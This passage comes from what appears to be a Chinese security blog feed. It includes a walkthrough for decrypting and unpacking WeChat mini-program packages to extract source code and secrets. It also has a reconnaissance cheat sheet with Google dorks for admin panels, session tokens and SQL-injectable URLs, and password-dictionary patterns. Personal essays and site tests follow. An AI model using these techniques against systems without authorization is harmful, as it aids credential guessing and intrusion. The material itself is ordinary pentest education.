alt="image-20231030145549897"></p><p>说明：如果打开后看到多个.wxapkg，这是一种防御手段，称为分包，处理方式还是一样，对所有.wxapkg文件进行解密、解包即可(无非就是多逆向几个包而已)【文件大小最大的一般是主包】</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030210013880.png" alt="image-20231030210013880"></p><p>使用010editor打开，可以看到V1MMWX这样的文件头，V1MMWX标识就是加密后所添加的标识</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030145738408.png"></p><p>Windows版的微信小程序的加密流程：</p><ol><li>首先pbkdf2生成AES的key。利用微信小程序id字符串为pass，salt为<strong>saltiest</strong> 迭代次数为1000。调用pbkdf2生成一个32位的key</li><li>首先取原始的wxapkg的包得前1023个字节通过AES通过1生成的key和iv(<strong>the iv: 16 bytes</strong>),进行加密</li><li>接着利用微信小程序id字符串的倒数第2个字符为xor key，依次异或1023字节后的所有数据，如果微信小程序id小于2位，则xorkey 为 <strong>0x66</strong></li><li>把AES加密后的数据（1024字节）和xor后的数据一起写入文件，并在文件头部添加<strong>V1MMWX</strong>标识</li></ol><p>下面两个github项目都可以对Windows版的微信小程序进行解密操作</p><ul><li><a href="https://github.com/superdashu/pc_wxapkg_decrypt_python">https://github.com/superdashu/pc_wxapkg_decrypt_python</a></li><li><a href="https://github.com/BlackTrace/pc_wxapkg_decrypt">https://github.com/BlackTrace/pc_wxapkg_decrypt</a></li></ul><p>这里使用pc_wxapkg_decrypt进行解密：</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030175422842.png" alt="image-20231030175422842"></p><ul><li>注意：<ul><li>路径中不要带空格，否则会报错，类似“Program File”这种，要避免</li></ul></li><li>解密命令</li></ul><pre class="line-numbers language-none"><code class="language-none">#.\pc_wxapkg_decrypt.exe -wxid 小程序ID -in __APP__.wxapkg路径.\pc_wxapkg_decrypt.exe -wxid wx518a2b2e96ce3ca0 -in C:\Users\Zeroten\Desktop\微信小程序解包测试\__APP__.wxapkg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030180007316.png" alt="image-20231030180007316"></p><p>解密后的文件默认名称为dec.wxapkg，会直接生成在pc_wxapkg_decrypt.exe所在目录下</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030180405972.png" alt="image-20231030180405972"></p><p>解密后的包就是需要通过解析来获取小程序源码的包，这里先使用010editor查看小程序的结构</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030180830409.png" alt="image-20231030180830409"></p><p>从旁边的文件目录中可以看出，这种包并非是一个压缩格式的包，而是一个二进制的包，所以需要特定的方法解包</p><ol start="3"><li>解包操作：</li></ol><p>下面两个github项目都可以微信小程序进行解包操作：</p><ul><li><a href="https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad">https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad</a></li></ul><pre class="line-numbers language-none"><code class="language-none">#执行后，会在dec.wxapkg目录下生成解包后的文件夹python3 unwxapkg.py dec.wxapkg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030182724709.png" alt="image-20231030182724709"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030182857180.png" alt="image-20231030182857180"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030182913615.png" alt="image-20231030182913615"></p><p>目录介绍：</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030210847809.png" alt="image-20231030210847809"></p><p>敏感关键词：appid、secret(如果这个appid和secret可以使用，就能获取到seesion_key)，下面是微信官方的小程序登录流程【<a href="https://developers.weixin.qq.com/miniprogram/dev/framework/open-ability/login.html%E3%80%91">https://developers.weixin.qq.com/miniprogram/dev/framework/open-ability/login.html】</a></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030212430785.png" alt="image-20231030212430785"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/api-login.2fcc9f35.jpg" alt="img"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030212404448.png" alt="image-20231030212404448"></p><ul><li><a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></li></ul><pre class="line-numbers language-none"><code class="language-none">#执行后，会在dec.wxapkg目录下生成解包后的文件夹node wuWxapkg.js dec.wxapkg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030185209297.png" alt="image-20231030185209297"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030185415461.png" alt="image-20231030185415461"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030185634433.png" alt="image-20231030185634433"></p><p>如提示，检测到此包是分包后的子包，使用-s参数指定存放路径即可</p><pre class="line-numbers language-none"><code class="language-none">#node wuWxapkg.js 分包.wxapkg -s&#x3D;&#x2F;分包所在目录node wuWxapkg.js _19871000_28.wxapkg -s&#x3D;..&#x2F;_1514036652_28<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>鸣谢：</p><ul><li><a href="https://misakikata.github.io/2021/03/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%A7%A3%E5%8C%85/">微信小程序解包 ~ Misaki’s Blog (misakikata.github.io)</a></li><li><a href="https://mp.weixin.qq.com/s/QAKBcW9TzyH0bFW_oYZgIA">攻防实战]外网突破 (qq.com)</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集手法备忘录</title>
      <link href="/2023/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%8B%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>/2023/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%8B%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>外网信息收集方式一览：</p><p><img src="/2023/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%8B%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/1641980627-617290-image.png" alt="img"></p><p>通用字典制作：一本针对性强的字典，能够提高命中率，更加精准</p><ul><li>企业邮箱前缀、子域名可以作为用户名&#x2F;密码字典的制作</li></ul><p>说明：</p><ul><li>邮箱是一个很重要的渠道，如查询某edu大学的邮箱的时候 ，很多时候能从邮箱中找到学号和工号</li></ul><p>邮箱查询：邮箱查询可以类比挖子域名来理解，通过情报系统收集暴露在互联网上的邮箱，比如你知道@qq.com，那么通过邮箱查询就可以查到用户暴露在互联网上的QQ邮箱(即<a href="mailto:&#120;&#120;&#120;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;">&#120;&#120;&#120;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;</a>)。下面列举一些可以查询邮箱的网址</p><ul><li><a href="https://phonebook.cz/">https://phonebook.cz</a></li><li><a href="https://hunter.io/">https://hunter.io</a></li><li><a href="http://www.skymem.info/">http://www.skymem.info</a></li><li><a href="https://www.email-format.com/i/search">https://www.email-format.com/i/search</a></li><li><a href="https://app.snov.io/domain-search">https://app.snov.io/domain-search</a></li></ul><p>用户名字典制作：</p><p><img src="/2023/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%8B%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/image-20231027101236433.png" alt="image-20231027101236433"></p><p>密码字典制作：</p><p>一些常识与实战常用密码规律</p><ul><li><p>针对同一个目标，要注意密码复用(又称撞库、密码碰撞)【如许多设备默认口令的web端和ssh或者telnet的口令是一样的】【内网业务系统习惯使用同一套帐户密码】【有很多管理员为了管理方便，用同一套密码管理不同服务器】</p></li><li><p>员工姓名全拼、简拼、简单变形(zhangsan、zhangsan123、zs123456等)</p></li><li><p>员工生日&#x2F;身份证后六位&#x2F;手机号后六位</p></li><li><p>企业域名(xxx.com)、企业英文名或域名#年份(xxx#2018)、企业英文名或域名@123(xxx@123、xxx123、xxx2018)、企业缩写加年份(xxx@2021 xxx*2020)、企业域名+999(xxx.com999、xxx.com666)</p></li><li><p>多关注系统后台、组件的默认密码【获得途径：搜索引擎、官方手册等】</p></li></ul><p>搜索引擎查询(以谷歌为例)：基本思路是site、host配合inurl、intext、intitle，或者filetype找敏感文件。下面列举几个常用的谷歌聚合查询语句，其他搜索引擎类似【注意：用谷歌语法找站的时候，要加点中文，不然搜出来的站可能都是英文站】</p><ul><li><code>site:example.com intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|manage|admin|login|system</code></li><li><code>site:example.com inurl:login|admin|manage|manager|admin_login|login_admin|system</code></li></ul><p>经验：如果某公司&#x2F;学校有私有系统，可以考虑去找使用手册之类的东西（因为某些公司&#x2F;学校上线新的系统基本上会为员工或者老师准备操作手册，操作手册中会有系统截图，如果管理员截图打码不严格，就可能会泄露账号或者密码信息，除此之外，操作手册中还会记录系统部署方式、系统默认账号密码、系统如何操作使用等有价值的信息）。下面还是以谷歌搜索为例</p><ul><li><code>site:example.com intext:&quot;手册&quot;</code></li><li><code>site:example.com intext:&quot;文档&quot;</code></li></ul><p>除此之外，还有一些常用的谷歌搜索语法</p><ul><li><code>site:example.com intext:&quot;忘记密码&quot;</code></li><li><code>site:example.com intext:&quot;工号&quot;</code></li><li><code>site:example.com intext:&quot;优秀员工&quot;</code></li><li><code>site:example.com intext:&quot;身份证号码&quot;</code></li><li><code>site:example.com intext:&quot;手机号&quot;</code></li></ul><p>下面列举几个搜索可能产生未授权访问漏洞的谷歌语法【再次强调，这只是信息搜集阶段，即使不能未授权访问成功，也可以收集到一些有用的信息，比如用户名、密码等】</p><ul><li><code>site:example.com inurl:token</code></li><li><code>site:example.com inurl:cookie</code></li><li><code>site:example.com inurl:session</code></li><li><code>site:example.com inurl:jsession</code></li><li><code>site:example.com inurl:userid</code></li><li><code>site:example.com inurl:passwd</code></li></ul><p>下面列举几个搜索SQL注入的谷歌语法【参数不一定要是id，也可以是tid、keyword之类的其它参数】</p><ul><li><code>公司inurl:php?id=</code></li><li><code>公司inurl:asp?id=</code></li><li><code>公司inurl:aspx?id=</code></li><li><code>公司inurl:list.php?id=</code></li></ul><p>下面列举几个搜索弱密码、越权、找后台的谷歌语法【根据经验，asp和aspx的后台还有越权漏洞，禁用JS，然后直接访问后台URL，有大概率直接进去】</p><ul><li><code>后台inurl:php</code></li><li><code>后台inurl:asp</code></li><li><code>后台inurl:aspx</code></li><li><code>后台site:edu.cn</code></li></ul><p>新媒体信息搜集</p><p>说明：主要是微信公众号或者小程序等新媒体的信息搜集，有以下途径</p><ul><li>微信默认搜索【手动打开微信搜索即可】</li><li>小蓝本搜索【<a href="https://www.xiaolanben.com/%E3%80%91">https://www.xiaolanben.com/】</a></li><li>第三方微信公众号数据分析平台(这类平台大多都要注册一个账号才能使用)</li></ul><p>​易撰：<a href="http://www.yizhuan5.com/">http://www.yizhuan5.com/</a></p><p>​西瓜数据：<a href="http://data.xiguaji.com/">http://data.xiguaji.com/</a></p><p>​次幂数据：<a href="https://www.cimidata.com/">https://www.cimidata.com/</a></p><p>fofa信息搜集</p><p>下面以挖通用型漏洞为例，介绍使用fofa进行信息搜集的流程和技巧</p><ol><li>title&#x3D;”平台”【搜索网站标题中包含”平台”关键字的网站。可以依据名称判断是否为通用的系统，找到通用的系统进行下一步】</li><li>利用标题、图标、js特征文件搜索，找找其他类似的系统<ul><li><code>icon_hash=&quot;-247388890&quot;</code>【搜索指定icon图标哈希值的资产】</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生活而不是生存</title>
      <link href="/2023/10/21/%E6%98%AF%E7%94%9F%E6%B4%BB%E8%80%8C%E4%B8%8D%E6%98%AF%E7%94%9F%E5%AD%98/"/>
      <url>/2023/10/21/%E6%98%AF%E7%94%9F%E6%B4%BB%E8%80%8C%E4%B8%8D%E6%98%AF%E7%94%9F%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;昨天刚刚结束了市护网，本以为又是平平无奇的一场，但是我的搭档真的给了我极大的震撼，他们的一番话实实在在地触碰到了我的灵魂，我觉得这是一种心灵上的震撼，我学到了一种除技术之外的东西，是一种对生活的态度。</p><p>&emsp;&emsp;回望自己过去的人生，感觉那不算生活，更像是一种生存，这番话并不是对这些年生活的否定，更像是一种反省，因为我们经常处于一个圈子中，这会导致一种可怕观念的产生，就是我们会认为世界就是这么大，颇有一番井底之蛙的意味。其实有时候，跳出圈子去看看，你会发现，生活真的还有诗和远方。从初一的时候开始接触计算机，直到现在，我仿佛进入了另一个次元，在数字世界中一呆就是好几年，我最常说的一句话就是，互联网很神秘，我很感谢互联网，它让来自天南地北的我们相聚，就像在身边一样。但这也使得我从未去领略过真实世界的大好河山，我想去看看江南水乡，想看看北方的鹅毛大雪…….我并不是没有想过应对之法，我热爱互联网上的一切，总觉得互联网可以代替一切，回想起我刚接触“谷歌地球”时，我不禁感慨，我现在可以足不出户，就能看到地球上的任何一个点，但是时隔这么多年，我发现我错了，我看到的是死的，是没有灵魂的，我还记得那段时间我迷茫了很久。当Ai爆火时，我像是发现了一块新大陆，我着手开始学习原理、训练模型…….，我最感兴趣的是Ai绘图，不仅仅是底层的实现原理令我着迷，我更想是让Ai把世界“画”给我看，因为我总感觉我自己没机会去看了。刚开始基于包容性强的底模进行训练，Ai已经开始告诉我一些场景了，我很开心，但总觉得缺了什么，再后来我问了玩摄影的朋友，他告诉，光线是一副图的灵魂，从那时候起，我致力于光模型的调参与训练，我希望找到自己的光。现在，我手里的光模型已经能表现出拟真的光影效果，我很开心，我坚信着，我的Ai终于能把世界“画”给我看了，直到这次市护网，我遇到了我的搭档，很幸运，很感激她。</p><p>&emsp;&emsp;空余时间，她给我看了许多照片，我也自然向她展示了我Ai绘图的成果，我精心调参过后的模型，展现出来的效果是绝美而逼真的，但我发现我错了，她开始向我分享她一张张照片的故事，她记得每一张照片背后发生的事情，而我…….我的照片是死的。我边听着她一张张照片背后的故事，一边回望自己的过去，她走过好多地方，遇到过好多事，见过好多人，她的照片触及到了我的灵魂，她的照片充满了“生活气”，这正是我一直追求的，我越听眼眶越有点湿润了。照片可以不需要很美，照片的意义不在于画面，或者说，我恍然发现我缺失的不是世界样貌，而是生活。她拍了拍了我的肩，说了无数人之前和我说过的话，好好生活，对自己好点，多出去看看，不然以后就没机会了。我感觉，这一次，我听进去了。虽然很短暂，但是我真的很享受，很感谢她，由衷的。世界，是生活，大好河山和有趣的事，只能亲自去看。</p><p>&emsp;&emsp;接触计算机以来，我一直在不断学习技术，我享受这种在网络世界不断探索的乐趣，但不得不承认，我失去了一些宝贵的东西。另一位搭档也和我说了类似的话，我把所有时间花在技术上，这是我的爱好，他认可，但是他觉得这是一种生存，不是生活，得到却又失去了。遇到你们，对我而言，就像遇到了宝藏。我的灵魂，仿佛听进去了。</p><p>&emsp;&emsp;饱含热泪，去生活。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 醒言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客精神</title>
      <link href="/2023/10/06/%E9%BB%91%E5%AE%A2%E7%B2%BE%E7%A5%9E/"/>
      <url>/2023/10/06/%E9%BB%91%E5%AE%A2%E7%B2%BE%E7%A5%9E/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;前段时间太忙，把自己累倒了。学习路上，也要保重身体啊。无意间在网上看到一个帖子，与我的三观很契合，我由衷希望这种黑客精神留存在每一个技术人的血液里。帖子如下：</p><p>&emsp;&emsp;真正的黑客是这样的：<br>&emsp;&emsp;1. 一个计算机系统，不论软件还是硬件，在他们面前，就是一副清晰复杂又美妙的迷宫图，他了解迷宫的形状，边界，每个转弯，每个回廊，每个回路，每个岔口。<br>&emsp;&emsp;2. 你问他，这里有个难题，该怎么解决？<br>&emsp;&emsp;3. 他说：给我10秒，我来看一下。他看了一下他脑海中的那副迷宫图，找到你的难题的起点以及终点，发现它们离得很近，他说：哦，简单，你先朝这边走，然后朝那边走，然后这么拐个弯，就到终点了<br>&emsp;&emsp;4. 你又说：我太胖了，这里有个门太小，我过不去，怎么办？<br>&emsp;&emsp;5. 他哦了一声：这样啊？你等一下。他又看了看那副图，思索了片刻，然后说：这里还有个路，不算太远，但是有点绕，我给你画个图吧。<br>&emsp;&emsp;6. 你拿着图，按着走，于是到终点了。</p><p>&emsp;&emsp;真正的黑客绝不是故弄玄虚生怕别人看出自己几斤几两的人，真正的黑客，能把看似复杂难解的问题，清晰明了地说清楚。而对某个问题确实不知道答案时，也不会胡说一通掩盖自己，只会说：这个我现在不知道。如果你想知道答案，我可以花时间研究一下看看。“黑客精神”这个词已经不仅仅局限在封闭的圈子中了，很幸运，在我的圈子中遇到了那些真正具备黑客精神的人，他（她）们热情而充满活力，很感谢，一位位领路人。</p><p>&emsp;&emsp;技术是纯粹的，因为喜欢才做，而不是为了显摆忽悠。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 醒言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>苦乐人生</title>
      <link href="/2023/09/16/%E8%8B%A6%E4%B9%90%E4%BA%BA%E7%94%9F/"/>
      <url>/2023/09/16/%E8%8B%A6%E4%B9%90%E4%BA%BA%E7%94%9F/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;简单记录一下近况吧，这段时间确实诸事不顺，人生路上总有坎坷，在社会上混久了但还不太习惯。虽然走的是技术流但是还是得提防一些小人，长这么大了，遇到了形形色色的人，每个人都有对自己人生的理解。感觉有很多话，但是码起字来反而忘言了。</p><p>&emsp;&emsp;不知道你们的生活中是否见过这样一些场景，一些人能力不强但是却位居高位，我客观分析过无数次，大多这类人都有一下特点：擅长画饼、擅耍嘴皮、喜欢走关系。记得那句话怎么说来着，如果你没有能力，又喜欢耍嘴皮子，那你多半是个领导 <span class="emoji" alias="joy" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8">&#x1f602;</span>。我认识一个在国外工作的朋友，他说：“我遇到的最好的领导，同意我的一部分观点，同时耐心跟我解释，为什么不同意我的另一部分观点。我正在努力成为像他们一样的人”。我很有感触，如果你位居高位却不给别人带来实质性的好处，那么你可能德不配位，或者说有愧于人。但同时，小人却意识不到这一点，这类人坚定捍卫着有点类似像“为达目的可以不择手段”“得不到就毁掉”的极其错误的价值观。这其中就存在着一些矛盾点，你想要前进、想要上升就必须途径这些人。不清楚大家大学时期是否有参加过学生会，就好比竞选学生会，也许你能力强、成绩好、三观正、有责任心等等一系列在伦理道德评价里优秀的方面，但是往往事与愿违，当选者竟然是擅耍嘴皮、好吃懒做、偷奸耍滑之人，难道你的这些方方面面是一文不值的吗？错了，只是那些所谓的“评委”根本没资格选评你。</p><p>&emsp;&emsp;拉回到现实，也许你就能理解。</p><p>&emsp;&emsp;如果你对一些大公司或者知名工作室有所接触，你会发现，它们的HR多半是能力强的人，而不是靠浑水摸鱼、搞小动作上位的。他们面试你，能听懂你讲的术语和技术，换句话说，他们的能力确确实实在你之上。你奋斗了很久坐到HR的面前，但是我再告诉你一个情况，对方也奋斗了很久才坐到你的对面。这和很多优质团队的理念完全契合：优秀的人只愿于优秀的人共事。如果你是管理者，我可以负责任的告诉你，二流的人招进来的员工不可能是一流的。其实道理很简单，“物以类聚，人以群分”，我只不过是复述了老祖宗的话罢了。</p><p>&emsp;&emsp;话再说回来，这类小人善于包装，也许你有无数种报复的手段，但是我还是想把恩师告诉我的一种观念传达给你：己所不欲，勿施于人。</p><p>&emsp;&emsp;难道就只能被恶心吗？这个点我还没考虑清楚，这类人不会消除，甚至可以说比比皆是，小人是垂直于社会阶层的。</p><p>&emsp;&emsp;那打不过就加入？世界总有人付出也总有人坐享其成，你可以表面上闪着光却内心黑暗，但我真的建议你内心充满着暖暖旭阳，因为灵魂的闪耀会吸引具有情感共鸣的人，我也正这么做着。我说的很空洞，也许是我对人生理解的深度还不够。永远年轻，永远热泪盈眶。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 醒言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>标题级数测试</title>
      <link href="/2023/08/16/%E6%A0%87%E9%A2%98%E7%BA%A7%E6%95%B0%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/16/%E6%A0%87%E9%A2%98%E7%BA%A7%E6%95%B0%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>表格及任务列表测试</title>
      <link href="/2023/08/16/%E8%A1%A8%E6%A0%BC%E5%8F%8A%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/16/%E8%A1%A8%E6%A0%BC%E5%8F%8A%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>title | content<br>— | —<br>1 | 1<br>2 | 2</p><p>title | content<br>— | —<br>1 | 1<br>2 | 2</p><hr><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">jack</td></tr><tr><td align="center">2</td><td align="center">jim</td></tr><tr><td align="center">3</td><td align="center">nano</td></tr></tbody></table><table><thead><tr><th align="left">Tittle1</th><th align="center">Tittle2</th><th align="right">Tittle3</th></tr></thead><tbody><tr><td align="left">Content</td><td align="center">Content</td><td align="right">Content</td></tr><tr><td align="left">Content</td><td align="center">Content</td><td align="right">Content</td></tr></tbody></table><hr><ul><li><input checked disabled type="checkbox"> 吃饭</li><li><input disabled type="checkbox"> 睡觉</li><li><input checked disabled type="checkbox"> 看书</li><li><input disabled type="checkbox"> 锻炼</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学公式测试</title>
      <link href="/2023/08/15/%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/15/%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>数学公式渲染也修好了，下面测试几个数学公式，为了提高性能，数学公式要阅读全文才会渲染，预览图是不显示的</p><p>$$<br>J_\alpha(x) &#x3D; \sum_{m&#x3D;0}^\infty \frac{(-1)^m}{m! \Gamma (m + \alpha + 1)} {\left({ \frac{x}{2} }\right)}^{2m + \alpha}<br>$$</p><p>$$<br>evidence_{i}&#x3D;\sum_{j}W_{ij}x_{j}+b_{i}<br>$$</p><p>$$<br>\begin {matrix}<br>   1 &amp; 2 &amp; 3 \\<br>   4 &amp; 5 &amp; 6 \\<br>   7 &amp; 8 &amp; 9<br>  \end {matrix}<br>$$</p><p>$$<br>\frac{x}{2y} +\frac{x-y}{x+y}<br>$$</p>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>表情测试</title>
      <link href="/2023/08/15/%E8%A1%A8%E6%83%85%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/15/%E8%A1%A8%E6%83%85%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>表情渲染也修复好了，测试一下</p><p><span class="emoji" alias="neutral_face" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f610.png?v8">&#x1f610;</span><span class="emoji" alias="smile" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8">&#x1f604;</span><span class="emoji" alias="laughing" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">&#x1f606;</span><span class="emoji" alias="blush" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60a.png?v8">&#x1f60a;</span><span class="emoji" alias="smiley" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png?v8">&#x1f603;</span><span class="emoji" alias="relaxed" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/263a.png?v8">&#x263a;</span><span class="emoji" alias="smirk" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60f.png?v8">&#x1f60f;</span><span class="emoji" alias="heart_eyes" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60d.png?v8">&#x1f60d;</span><span class="emoji" alias="kissing_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f618.png?v8">&#x1f618;</span><span class="emoji" alias="kissing_closed_eyes" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61a.png?v8">&#x1f61a;</span><span class="emoji" alias="flushed" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f633.png?v8">&#x1f633;</span><span class="emoji" alias="relieved" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60c.png?v8">&#x1f60c;</span><span class="emoji" alias="satisfied" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">&#x1f606;</span><span class="emoji" alias="grin" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8">&#x1f601;</span><span class="emoji" alias="wink" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f609.png?v8">&#x1f609;</span><span class="emoji" alias="stuck_out_tongue_winking_eye" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61c.png?v8">&#x1f61c;</span><span class="emoji" alias="stuck_out_tongue_closed_eyes" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8">&#x1f61d;</span><span class="emoji" alias="grinning" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f600.png?v8">&#x1f600;</span><span class="emoji" alias="kissing" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f617.png?v8">&#x1f617;</span><span class="emoji" alias="kissing_smiling_eyes" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f619.png?v8">&#x1f619;</span><span class="emoji" alias="stuck_out_tongue" style 